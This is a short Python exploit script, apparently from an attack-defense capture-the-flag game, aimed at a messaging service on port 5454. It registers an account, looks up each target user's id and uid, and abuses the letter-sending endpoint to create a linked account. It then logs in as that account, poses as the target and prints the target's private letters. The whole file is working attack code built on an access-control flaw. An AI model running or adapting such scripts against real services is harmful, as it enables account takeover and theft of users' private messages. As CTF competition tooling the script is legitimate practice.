import asyncio
import requests
import random
import sys
import json
from api_client import ApiClient

ip = sys.argv[1]
# ip = "localhost"

BASE_URL = f"http://{ip}:5454/"
session = requests.Session()

# attack_data = [json.loads(s)["username"] for s in requests.get("http://10.10.10.10/api/client/attack_data").json()["gostpost"][ip]]
attack_data = ["seraphine8VdPk", "imreFzi33"]

nm = random.randbytes(6).hex()
ps = random.randbytes(6).hex()


r = session.post(
    f"{BASE_URL}/auth/register", json={"name": nm, "passphrase": ps, "parent": None}
)
my_id = r.json()["id"]

# async just for ApiClient


async def attack(name):
    r = session.post(f"{BASE_URL}/boyarin/get", json={"name": name})
    data = r.json()

    id = data["id"]
    uid = data["uid"]

    nm2 = random.randbytes(6).hex()
    ps2 = random.randbytes(6).hex()

    r = session.post(
        f"{BASE_URL}/letters/send",
        json={
            "recipient": {"uid": uid, "name": nm2, "passphrase": ps2, "son_id": id},
            "content": "",
            "is_encrypted": False,
        },
    )

    client = await ApiClient.login(BASE_URL, nm2, ps2)
    client.me = name
    letters, _ = await client.get_letters()
    for letter in letters:
        print(letter.content)
    client.close()


async def try_attack(name):
    try:
        await attack(name)
    except Exception as e:
        print(e)


async def attack_all():
    await asyncio.gather(*(try_attack(name) for name in attack_data))


asyncio.run(attack_all())
